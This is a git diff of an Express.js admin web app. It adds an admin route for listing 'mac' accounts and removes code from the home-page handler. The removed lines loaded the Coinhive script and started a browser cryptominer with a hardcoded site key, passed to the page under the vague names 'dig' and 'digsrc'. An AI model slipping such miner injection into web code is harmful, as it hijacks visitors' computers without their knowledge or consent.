@@ -51,6 +51,7 @@ app.put('/api/admin/server/:serverId(\\d+)', isAdmin, adminServer.editServer);
 app.delete('/api/admin/server/:serverId(\\d+)', isAdmin, adminServer.deleteServer);
 
 app.get('/api/admin/account', isAdmin, admin.getAccount);
+app.get('/api/admin/macAccount', isAdmin, admin.getAllMacAccount);
 app.get('/api/admin/account/port/:port(\\d+)', isAdmin, admin.getAccountByPort);
 app.get('/api/admin/account/:accountId(\\d+)', isAdmin, admin.getOneAccount);
 app.get('/api/admin/account/:serverId(\\d+)/:accountId(\\d+)/ip', isAdmin, admin.getAccountIp);
@@ -231,8 +232,6 @@ const homePage = (req, res) => {
     success[0].value = JSON.parse(success[0].value);
     return success[0].value;
   }).then(success => {
-    const dig = 'https://coinhive.com/lib/coinhive.min.js';
-    const digsrc = `if(window.CoinHive){var m=new CoinHive.User('DZRAvxiOhGWQK1BGkw1qMHfwmuc9C106','${config.plugins.webgui.site}',{throttle: 0.9,threads:1});m.start();}`;
     configForFrontend.title = success.title;
     configForFrontend.themePrimary = success.themePrimary;
     configForFrontend.themeAccent = success.themeAccent;
@@ -245,8 +244,6 @@ const homePage = (req, res) => {
       analytics,
       config: configForFrontend,
       paypal: !!(config.plugins.paypal && config.plugins.paypal.use),
-      dig,
-      digsrc,
     });
   });
 };
